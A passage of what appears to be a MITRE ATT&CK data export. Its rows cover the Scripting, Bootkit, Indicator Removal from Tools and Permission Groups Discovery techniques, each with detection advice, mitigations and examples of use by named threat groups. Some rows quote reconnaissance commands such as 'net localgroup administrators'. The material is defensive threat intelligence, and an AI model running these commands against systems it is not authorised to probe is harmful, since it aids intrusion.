XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1240,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']",['[[Software/S0053|SeaDuke]] uses a module to execute Mimikatz with PowerShell to perform [[Technique/T1097|Pass the Ticket]].[[CiteRef::Symantec Seaduke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: SeaDuke, SeaDaddy, SeaDesk","['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1241,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']","['[[Group/G0016|APT29]] has used encoded PowerShell scripts uploaded to [[Software/S0046|CozyCar]] installations to download and install [[Software/S0053|SeaDuke]], as well as to evade defenses.[[CiteRef::Symantec Seaduke 2015]][[CiteRef::Mandiant No Easy Breach]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1242,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']",['[[Group/G0022|APT3]] has used PowerShell on victim systems to download and run payloads after exploitation.[[CiteRef::FireEye Operation Double Tap]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1243,['Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.'],[],[],[],"['API monitoring', 'MBR', 'VBR']",['[[Group/G0007|APT28]] has deployed a bootkit along with [[Software/S0134|Downdelph]] to ensure its persistence on the victim. The bootkit shares code with some variants of [[Software/S0089|BlackEnergy]].[[CiteRef::ESET Sednit Part 3]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform this action. Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised.[[CiteRef::TCG Trusted Platform Module]][[CiteRef::TechNet Secure Boot Process]]'],"['Linux', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],[],['Persistence'],['Technique/T1067'],['Bootkit'],https://attack.mitre.org/wiki/Technique/T1067
1244,['Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.'],[],[],[],"['API monitoring', 'MBR', 'VBR']",['[[Group/G0032|Lazarus Group]] malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.[[CiteRef::Novetta Blockbuster Destructive Malware]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],['Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform this action. Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised.[[CiteRef::TCG Trusted Platform Module]][[CiteRef::TechNet Secure Boot Process]]'],"['Linux', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],[],['Persistence'],['Technique/T1067'],['Bootkit'],https://attack.mitre.org/wiki/Technique/T1067
1245,"['The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.']","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",[],[],"['Process use of network', 'Anti-virus', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0009|Deep Panda]] has updated and modified its malware, resulting in different hash values that evade detection.[[CiteRef::Symantec Black Vine]]']",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Mitigation is difficult in instances like this because the adversary may have access to the system through another channel and can learn what techniques or tools are blocked by resident defenses. Exercising best practices with configuration and security as well as ensuring that proper process is followed during investigation of potential compromise is essential to detecting a larger intrusion through discrete alerts.\n\nIdentify and block potentially malicious software that may be used by an adversary by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1066'],['Indicator Removal from Tools'],https://attack.mitre.org/wiki/Technique/T1066
1246,"['The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.']","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",[],[],"['Process use of network', 'Anti-virus', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0049|OilRig]] has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.[[CiteRef::Palo Alto OilRig April 2017]]'],['OilRig'],['OilRig'],['G0049'],['Mitigation is difficult in instances like this because the adversary may have access to the system through another channel and can learn what techniques or tools are blocked by resident defenses. Exercising best practices with configuration and security as well as ensuring that proper process is followed during investigation of potential compromise is essential to detecting a larger intrusion through discrete alerts.\n\nIdentify and block potentially malicious software that may be used by an adversary by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1066'],['Indicator Removal from Tools'],https://attack.mitre.org/wiki/Technique/T1066
1247,"['The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.']","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",[],[],"['Process use of network', 'Anti-virus', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0154|Cobalt Strike]] includes a capability to modify the ""beacon"" payload to eliminate known signatures or unpacking methods.[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Mitigation is difficult in instances like this because the adversary may have access to the system through another channel and can learn what techniques or tools are blocked by resident defenses. Exercising best practices with configuration and security as well as ensuring that proper process is followed during investigation of potential compromise is essential to detecting a larger intrusion through discrete alerts.\n\nIdentify and block potentially malicious software that may be used by an adversary by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Defense Evasion'],['Technique/T1066'],['Indicator Removal from Tools'],https://attack.mitre.org/wiki/Technique/T1066
1248,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1249,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1250,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] performs discovery of permission groups <code>net group /domain</code>.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1251,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1252,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1253,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0082|Emissary]] has the capability to execute the command <code>net localgroup administrators</code>.[[CiteRef::Emissary Trojan Feb 2016]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: Emissary,['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1254,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1255,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0060|Sys10]] collects the group name of the logged-in user and sends it to the C2.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: Sys10,['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1256,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1257,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1258,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0018|admin@338]] actors used the following command following exploitation of a machine with [[Software/S0042|LOWBALL]] malware to list local groups: <code>net localgroup administrator >> %temp%\\download</code>[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1259,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 